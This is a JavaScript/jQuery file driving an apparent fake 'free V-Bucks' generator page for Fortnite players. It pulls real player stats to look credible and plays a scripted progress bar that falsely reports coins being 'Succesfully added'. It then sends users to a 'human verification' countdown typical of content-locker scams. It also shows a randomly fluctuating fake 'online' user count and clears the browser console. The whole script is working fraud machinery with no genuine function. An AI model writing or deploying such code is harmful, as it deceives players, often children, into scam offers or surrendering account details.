$(document).ready(function() {	

	$vb_a_1 = "10000";
	$vb_a_2 = "20000";
	$vb_a_3 = "50000";
	$vb_a_4 = "75000";
	$vb_i_1 = "imgs/points.png";
	$vb_i_2 = "imgs/points.png";
	$vb_i_3 = "imgs/points.png";
	$vb_i_4 = "imgs/points.png";
	
	$c_msg_1 = "Loading..."; 
	$c_msg_2 = "Adding <span class='vbs-progress-c-msg-val'></span> "+ coins_name +" to <span class='vbs-progress-u-msg-val'></span>";
	$c_msg_3 = "Succesfully added <span class='vbs-progress-c-msg-val'></span>  "+ coins_name +"";
	$c_msg_4 = "Loading...";
	$c_msg_5 = "We are almost there...";
	$c_msg_6 = "<span class='progress-msg-info'>Validation required</span>";
	$c_msg_7 = "<span class='progress-msg-info'>Last step before receiving your "+ coins_name +"</span>";
	
	var $human_verification_timer_value = '900'; //Countdown remaing time in seconds	
	
	if($('#header-particles').length){
		particlesJS.load('header-particles', 'js/particlesjs-config.json');
	}
	var $selected_platform;
	$('#gfs').click(function() {
		new Audio('audio/transition-2.mp3').play() ;
		let r = Math.random().toString(36).substring(7);
		$('.m-content').append('<div id="'+r+'"></div>');
		gS( "fdg3_1", function(src) {
			$( '#'+r ).html(src).hide().fadeIn();
			$.magnificPopup.open({
				items: {
					src: '#hd-vbs',
				},
				type: 'inline',
				preloader: false,
				mainClass: 'animated slideInUp',
				modal: true,
				fixedContentPos: true,
				fixedBgPos: true,
				callbacks: {
					open: function() {
						var selected_platform;	
						selected_platform = '';
						function fixplatformBox($platform_parent_class) {
							resetplatformBoxes();
							if ($platform_parent_class.hasClass('platform-item-1')) {
								selected_platform = 'Windows PC';
								$('#vbs-p-v-input').val('pc');
								$platform_icon = "<i class='fab fa-windows platform-select-icon'></i>";
							}
							if ($platform_parent_class.hasClass('platform-item-2')) {
								selected_platform = 'Playstation';
								$('#vbs-p-v-input').val('ps');
								$platform_icon = "<i class='fab fa-playstation platform-select-icon'></i>";
							}
							if ($platform_parent_class.hasClass('platform-item-3')) {
								selected_platform = 'Xbox';
								$('#vbs-p-v-input').val('xb');
								$platform_icon = "<i class='fab fa-xbox platform-select-icon'></i>";
							}
							if ($platform_parent_class.hasClass('platform-item-4')) {
								selected_platform = 'Android';
								$('#vbs-p-v-input').val('an');
								$platform_icon = "<i class='fab fa-android platform-select-icon'></i>";
							}
							if ($platform_parent_class.hasClass('platform-item-5')) {
								selected_platform = 'iOS';
								$('#vbs-p-v-input').val('io');
								$platform_icon = "<i class='fab fa-apple platform-select-icon'></i>";
							}
							if ($platform_parent_class.hasClass('platform-item-6')) {
								selected_platform = 'Nintendo';
								$('#vbs-p-v-input').val('ns');
								$platform_icon = "<i class='fab fa-nintendo-switch platform-select-icon'></i>";
							}
							$platform_parent_class.addClass('active');
							$platform_parent_class.addClass('animated jello').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
								$(this).removeClass('animated jello');
							});	
						}	
						function resetplatformBoxes() {
							var $platform_list = $('.platform-item-1, .platform-item-2, .platform-item-3, .platform-item-4, .platform-item-5, .platform-item-6');	
							if ($platform_list.hasClass('active')) {
								$platform_list.removeClass('active');
							}
						}	
						$('.platform-item').click(function() {
							fixplatformBox($(this));
									new Audio('audio/button.mp3').play() ;
						});
						$('#gss').click(function() {							
							if($('#vbs-u-v-input').val() == '') {
								aO( $('.username-field-wrapper'), 'shake' );
								$('.error-w-1').fadeIn(function() {					
									setTimeout(function(){ $('.error-w-1').fadeOut() }, 1000);
									new Audio('audio/fail.mp3').play() ;			
								});
							} else if(selected_platform == '') {
								aO( $('.platform-field-wrapper'), 'shake' );
								$('.error-w-2').fadeIn(function() {					
									setTimeout(function(){ $('.error-w-2').fadeOut() }, 1000);
									new Audio('audio/fail.mp3').play() ;	
								});
							} else if ($('#vbs-u-v-input').val() != '' &&  selected_platform != '') {
								var $username = $('#vbs-u-v-input').val();
								var $selected_platform = selected_platform;
								$('#gss').html('<span><i class="fas fa-circle-notch fa-spin"></i></span>');
									new Audio('audio/transition-2.mp3').play() ;	
								mMV();
							} else if ($('#vbs-u-v-input').val() != '' &&  $('#vbs-p-v-input').val() == 'an' || $('#vbs-p-v-input').val() == 'io' || $('#vbs-p-v-input').val() == 'ns') {
								var $username = $('#vbs-u-v-input').val();
								var $selected_platform = selected_platform;
								$('#gss').html('<span><i class="fas fa-circle-notch fa-spin"></i></span>');
								mNV();
									new Audio('audio/transition-2.mp3').play() ;	
							}
						});						
					}
				}
			});	
		});	
	});	
	function mMV(){			
		$username = $('#vbs-u-v-input').val();
		$.ajax({
			type: "POST",
			url: "fdg342df/fdg3_2.php",
			data: $('#fortnite-player-form').serialize(),
			dataType : 'json',
			success: function(dataprocess){
				if (dataprocess.hasOwnProperty('error')) {
					mNV();	
				} else {
					$solo = dataprocess.stats.p2;	
					if ($solo == undefined) {
						mNV();
					}
					else {
						if ($solo !== undefined) {	
							$solo_wins = $solo.top1.valueInt;	
						}	
						if ($solo !== undefined) {	
							$solo_matches = $solo.matches.valueInt;
						}	
						if ($solo !== undefined) {	
							$solo_kd = $solo.kd.valueDec;	
						}
						if ($solo !== undefined) {		
							$solo_kills = $solo.kills.valueInt;
						}	
						$profile_username = dataprocess.epicUserHandle;
						gS( "fdg3_3", function(src) {
							$( '.hd-step' ).html(src).hide().fadeIn();
							$("#fs-c-un").html('<div class="username-selected-platform">' + $platform_icon + '</div>' + $profile_username);	
							$("#val-wins").html($solo_wins);
							$("#val-matches").html($solo_matches);			
							$("#val-kills").html($solo_kills);
							$("#val-kd").html($solo_kd);									
							$('#gts').click(function() {
								gS( "fdg3_4", function(src) {
									$( '.hd-step' ).html(src).hide().fadeIn();	
									$('.resource-one-item-wrapper').click(function () {		
										if ($(this).hasClass("resource-one-item-wrapper-1")) { 
											$s_vb_a = $vb_a_1;																			
											$s_vb_i = $vb_i_1;																			
										} else if ($(this).hasClass("resource-one-item-wrapper-2")) { 
											$s_vb_a = $vb_a_2;
											$s_vb_i = $vb_i_2;
										} else if ($(this).hasClass("resource-one-item-wrapper-3")) { 
											$s_vb_a = $vb_a_3;
											$s_vb_i = $vb_i_3;
										} else if ($(this).hasClass("resource-one-item-wrapper-4")) { 
											$s_vb_a = $vb_a_4;
											$s_vb_i = $vb_i_4;
										}
										$(".resource-one-item-wrapper-1").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).hide();
										});
										$(".resource-one-header").addClass('animated fadeOutUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).hide();
										});
										setTimeout(function() {
											$(".resource-one-item-wrapper-2").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).hide();
											});
										}, 150 );
										setTimeout(function() {
											$(".resource-one-item-wrapper-3").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).hide();
											});
										}, 300 );
										setTimeout(function() {
											$(".resource-one-item-wrapper-4").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).hide();
											});
										}, 450 );
										setTimeout(function() {
											gS( "fdg3_5", function(src) {
												$( '.hd-step' ).html(src).hide().fadeIn();
												$("#vbscuim").attr("src",$s_vb_i);
												function progressBar(percent, $element, duration) {
													var progressBarWidth = percent * $element.width() / 100;
													$element.find('div').animate({ width: progressBarWidth }, duration).html(percent + "%&nbsp;");
												}
												progressBar(0, $('#vbs-progressBar'), 1);
												progressBar(100, $('#vbs-progressBar'), 21000);
												sT(0, $c_msg_1, 0, 0, 0);
												sT(2500, $c_msg_2, 1, 0, 0);
												sT(7000, $c_msg_3, 2, 0, 1);
												sT(10000, $c_msg_4, 0, 0, 3);
												sT(13000, $c_msg_5, 0, 0, 0);
												sT(15000, $c_msg_6, 0, 0, 2);
												sT(18000, $c_msg_7, 0, 0, 2);
												sT(20500, '', 0, 1, 0);
											});								
										}, 600 );									
									});
								});														
							});
						});
					}
				}
			},
			error: function(){
				mNV();
			}
		});
	}
	function mNV(){
		gS( "fdg3_4", function(src) {
			$( '.hd-step' ).html(src).hide().fadeIn();	
			$('.resource-one-item-wrapper').click(function () {										
				if ($(this).hasClass("resource-one-item-wrapper-1")) { 
						new Audio('audio/button.mp3').play() ;
					$s_vb_a = $vb_a_1;																			
					$s_vb_i = $vb_i_1;																			
				} else if ($(this).hasClass("resource-one-item-wrapper-2")) { 
						new Audio('audio/button.mp3').play() ;
					$s_vb_a = $vb_a_2;
					$s_vb_i = $vb_i_2;
				} else if ($(this).hasClass("resource-one-item-wrapper-3")) { 
						new Audio('audio/button.mp3').play() ;
					$s_vb_a = $vb_a_3;
					$s_vb_i = $vb_i_3;
				} else if ($(this).hasClass("resource-one-item-wrapper-4")) { 
						new Audio('audio/button.mp3').play() ;
					$s_vb_a = $vb_a_4;
					$s_vb_i = $vb_i_4;
				}
				$(".resource-one-item-wrapper-1").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
					$(this).hide();
				});
				$(".resource-one-header").addClass('animated fadeOutUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
					$(this).hide();
				});
				setTimeout(function() {
					$(".resource-one-item-wrapper-2").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
						$(this).hide();
					});
				}, 150 );
				setTimeout(function() {
					$(".resource-one-item-wrapper-3").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
						$(this).hide();
					});
				}, 300 );
				setTimeout(function() {
					$(".resource-one-item-wrapper-4").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
						$(this).hide();
					});
				}, 450 );
				setTimeout(function() {
					gS( "fdg3_5", function(src) {
						$( '.hd-step' ).html(src).hide().fadeIn();
						new Audio('audio/transition-2.mp3').play() ;	
						$("#vbscuim").attr("src",$s_vb_i);
						function progressBar(percent, $element, duration) {
							var progressBarWidth = percent * $element.width() / 100;
							$element.find('div').animate({ width: progressBarWidth }, duration).html(percent + "%&nbsp;");
						}
						progressBar(0, $('#vbs-progressBar'), 1);
						progressBar(100, $('#vbs-progressBar'), 21000);
						sT(0, $c_msg_1, 0, 0, 0);
						sT(2500, $c_msg_2, 1, 0, 0);
						sT(7000, $c_msg_3, 2, 0, 1);
						sT(10000, $c_msg_4, 0, 0, 3);
						sT(13000, $c_msg_5, 0, 0, 0);
						sT(15000, $c_msg_6, 0, 0, 2);
						sT(18000, $c_msg_7, 0, 0, 2);
						sT(20500, '', 0, 1, 0);
					});								
				}, 600 );									
			});
		});	
	}
	function sT(tD, cms, gc, sl, cl) {
		setTimeout(function() {	
			$(".vbs-progress-msg").html(cms);
			aO( $(".vbs-progress-msg"), 'bounceIn' );
			if (gc === 1) {				
				$('.vbs-progress-loader').fadeOut(function() {
					aO( $('.vbs-progress-g-item'), 'bounceIn' );
					$('.vbs-progress-g-item').fadeIn(function() {
						$('.vbs-progress-g-item-value').countTo({
							from: 0,
							to: $s_vb_a,
							speed: 2000,
							refreshInterval: 10
						});				
					new Audio('audio/count.mp3').play() 						
					});						
				});	
				$('.vbs-progress-c-msg-val').html($s_vb_a);
				$('.vbs-progress-u-msg-val').html($username);
            }
			if (gc === 2) {
				$('.vbs-progress-g-item').fadeOut(function() {
					aO( $('.vbs-progress-loader'), 'bounceIn' );
					$('.vbs-progress-loader').fadeIn();	
				});
				$('.vbs-progress-c-msg-val').html($s_vb_a);
			}	
			if (cl === 1) {
				$('.vbs-progress-loader').html("<span class='fas fa-check-circle loader-success'></span>");		
				aO( $(".vbs-progress-loader"), 'bounceIn' );	
					new Audio('audio/transition-1.mp3').play() 
            }
			if (cl === 2) {
				$('.vbs-progress-loader').html("<span class='fas fa-info-circle loader-info'></span>");
				aO( $(".vbs-progress-loader"), 'bounceIn' );
					new Audio('audio/fail.mp3').play() 
            }
			if (cl === 3) {
				$('.vbs-progress-loader').html("<span class='fas fa-cog fa-spin'></span>");				
				aO( $(".vbs-progress-loader"), 'bounceIn' );
            }
			if (sl === 1) {
				gS( "fdg3_6", function(src) {
						new Audio('audio/transition-2.mp3').play() 
					$( '.vbs-s-wrapper' ).html(src);
					$(".v-r-img").attr("src",$s_vb_i);					
					$('#v-username').html($username);
					$('#v-amount').html($s_vb_a);
					$('.v-r-i-amount').html($s_vb_a);
					$('.venobox').venobox(); 
					human_verification_timer.init($human_verification_timer_value);
				});	
            }
		}, tD );
	}
	function aO(el, anim, onDone) {
		var $el = $(el);
		$el.addClass( 'animated ' + anim );
		$el.one( 'animationend', function() {
			$(this).removeClass( 'animated ' + anim );
			onDone && onDone();
		});
	}
	function gS(step, onStep) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'fdg342df/' + step + '.php');
        xhr.setRequestHeader("X-REQUESTED-WITH", 'xmlhttprequest');
        xhr.addEventListener('readystatechange', function() {
            if (xhr.readyState == 4) {
                onStep && onStep(xhr.responseText)
            }
        });
        xhr.send()
		console.clear();
		console.log("\n");
    }
});
////////////////
// Status - Online Count
////////////////
var starting_number = 500;
var random;
function online_count() {
	document.getElementById("online-count").innerHTML = starting_number;
	var randCalc = Math.floor(Math.random() * 10 + 1);
	if (randCalc <= 5) {
		starting_number = starting_number + Math.floor(Math.random() * 10 + 1);;
	} else {
		starting_number = starting_number - Math.floor(Math.random() * 10 + 1);;
	}
	random = setTimeout("online_count()", 1000);
}
online_count();

////////////////
// Status - Last Update
////////////////
document.getElementById("date").innerHTML = formatAMPM();
function formatAMPM() {
	var d = new Date(),

		hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours(),
		ampm = d.getHours() >= 12 ? 'pm' : 'am',
		months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
		days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
	return d.getDate() + ' ' + months[d.getMonth()] + ' ' + d.getFullYear() + ' ';


}

function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);

}
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};

////////////////
// Human Verification Countdown
////////////////
var human_verification_timer = function () {
    var time_left = 1;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();

// $('#gfs').click( () => new Audio('audio/button.mp3').play() );